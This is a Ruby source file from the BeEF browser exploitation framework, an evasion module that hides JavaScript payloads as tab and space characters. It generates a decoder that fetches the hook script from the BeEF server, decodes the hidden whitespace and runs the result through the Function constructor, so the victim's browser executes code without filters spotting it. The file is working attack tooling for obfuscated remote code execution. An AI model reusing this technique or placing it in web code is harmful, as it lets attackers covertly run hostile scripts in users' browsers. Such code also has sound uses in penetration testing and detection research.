#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module Evasion
      class Whitespace
        include Singleton

        def need_bootstrap
          false
        end

        def execute(input, config)
          print_debug input.length
          encoded = encode(input)
	        var_name = BeEF::Extension::Evasion::Helper::random_string(3)

          config = BeEF::Core::Configuration.instance
          hook = config.get("beef.http.hook_file")
          host = config.get("beef.http.host")
          port = config.get("beef.http.port")
          decode_function =
"
//Dirty IE6 whitespace bug hack
#{var_name} = function (){
  jQuery.get(\'http://#{host}:#{port}#{hook}\', function callback(data) {
    var output = '';
    var str = '//E'+'OH';
    var chunks = data.split(str);
    for (var i = 0; i < chunks.length; i++)
    {
      if(chunks[i].substring(0,4)  == '----')
      {
        input = chunks[i].split('\\n');
        input = input[0].substring(5);
        for(y = 0; y < input.length/8; y++)
        {
          v = 0;
          for(x = 0; x < 8; x++)
          {
	          if(input.charCodeAt(x+(y*8)) > 9)
	          {
		          v++;
	          }
	          if(x != 7)
	          {
		          v = v << 1;
	          }
          }
          output += String.fromCharCode(v);
        }
      }
    }alert(output.length);[].constructor.constructor(output)();
  }, 'text');
}
#{var_name}();//EOH-----"

	        input = "#{decode_function}#{encoded}"
          print_debug "[OBFUSCATION - WHITESPACE] Javascript has been Whitespace Encoded"
          input
        end

        def encode(input)                 
          output = input.unpack('B*') 
          output = output.to_s.gsub(/[\["01\]]/, '[' => '', '"' => '', ']' => '',  '0' => "\t", '1' => ' ')
          output
        end
      end
    end
  end
end
